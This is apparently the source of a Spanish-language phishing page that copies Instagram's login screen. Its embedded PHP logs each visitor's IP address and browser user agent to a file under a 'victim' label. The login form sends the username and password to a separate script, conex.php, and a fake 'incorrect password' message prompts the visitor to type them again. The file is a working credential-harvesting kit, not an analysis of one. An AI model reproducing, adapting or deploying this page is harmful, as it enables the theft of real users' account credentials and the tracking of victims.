<!DOCTYPE html>
<html>
<head>
  <title>Instagram</title>
  <link rel="stylesheet" type="text/css" href="CSS/CssError.css">
<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";//para que recoja la IP de Internet
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";//para que vea si hay un proxy
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';//esto es para que se vayan los datos al fichero ip.txt
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);


fclose($fp);
?>
</head>
<body style="background-color:rgba(250,250,250)">

  <meta http-equiv=”Content-Type” content=”text/html; charset=UTF-8″ />
<div class="principal">
      <div class="subprin">
            <img src="..\Imagenes\Imagen.png" class="movil">
             <div class="imagenes">
                       <img src="..\Imagenes\Carousel5.PNG" class="image" alt="">
                       <img src="..\Imagenes\Carousel4.PNG" class="image" alt="">
                       <img src="..\Imagenes\Carousel3.PNG" class="image" alt="">
                       <img src="..\Imagenes\Carousel2.PNG" class="image" alt="">
                       <img src="..\Imagenes\Carousel1.PNG" class="image" alt="">
                    <script type="text/javascript">

                         let counter = 0;

                      let images = document.querySelectorAll(".image");
                      showImages(counter);
                      function showImages(n){
                        images[n].style.display = "block";
                      }

                      setInterval(imageDisplay, 4000);

                      function imageDisplay() {
                      images[counter].style.display = "none";

                      counter++;
                      
                      if (counter == images.length) {
                        counter = 0;
                      }
                      
                      images[counter].style.display = "block";
                    
              }
                       </script>

                     </div>
      <div class="mitad">
         
      </div>
   </div>
   <div class="subprincipal">
    <form method="POST" action="conex.php">
            <div class="container-img">
               <img src="..\Imagenes\Logo.png" class="logotipo">
            </div>
               <input type="text" placeholder="Teléfono, usuario o correo electrónico" name="usuario">
               <input type="password" placeholder="Contraseña" name="contraseña">
               <button class="boton" type="submit" name="submit">Iniciar sesión </button>
                   <div class="container-or">
                     <hr>
                     &nbsp;&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;&nbsp; 
                     <hr>
                  </div>
                        <div class="container-iconf">
                              <label class="icon-facebook"><a href=""><img src="..\Imagenes\IconoFacebook.png"></a> Iniciar sesion con Facebook </label>
                         </div>
                         <br>
                         <p align="center" class="Error">Tu contraseña no es correcta. Vuelve <br> a intentarlo</p>
                            <div class="container-passwd">
                                 ¿Has olvidado la contraseña?
                           </div>
                           <div class="container-register">
                              <p >¿No tienes una cuenta? <a href="#">Registrate</a></p>
                              
                           </div>
                           <div class="Botones-Descarga">
                                 Descarga la aplicación
                              <br>
                              <br>
                              <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="..\Imagenes\GooglePlay.png"></a>
                              <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=6383ABCF-59D1-4DB7-B6D5-A09BAE8EF642&utm_content=lo&utm_medium=badge"><img src="..\Imagenes\AppStore.png"></a>
                           </div>
      </form>
   </div>

</div>
  <footer class="footer">
    <div class="piepagina">
      <div class="linea1">
         <div class="li1">
            <div class="op1">
               <table>
                  <td><a href="https://about.instagram.com/" style="text-decoration:none"> Información</a></td>
                  <td><a href="https://about.instagram.com/blog" style="text-decoration:none"> Blog</a></td>
                  <td><a href="https://about.instagram.com/about-us/careers" style="text-decoration:none"> Empleo</a></td>
                  <td><a href="https://help.instagram.com/" style="text-decoration:none"> Ayuda</a></td>
                  <td><a href="https://www.instagram.com/developer/" style="text-decoration:none"> API</a></td>
                  <td><a href="https://help.instagram.com/519522125107875" style="text-decoration:none"> Privacidad</a></td>
                  <td><a href="https://help.instagram.com/581066165581870" style="text-decoration:none"> Condiciones</a></td>
                  <td><a href="https://www.instagram.com/directory/profiles/" style="text-decoration:none"> Cuentas destacadas</a></td>
                  <td><a href="https://www.instagram.com/directory/hashtags/" style="text-decoration:none"> Hastags</a></td>
                  <td><a href="https://www.instagram.com/explore/locations/" style="text-decoration:none"> Ubicaciones</a></td>
               </table>
            </div>
         </div>  
    </div>
      <div class="linea2">
         <div class="caj2">
            <section>© 2021 Instagram from Facebook</section>
         </div>      
         </div>
    </div>
  </footer>
</body>
</html>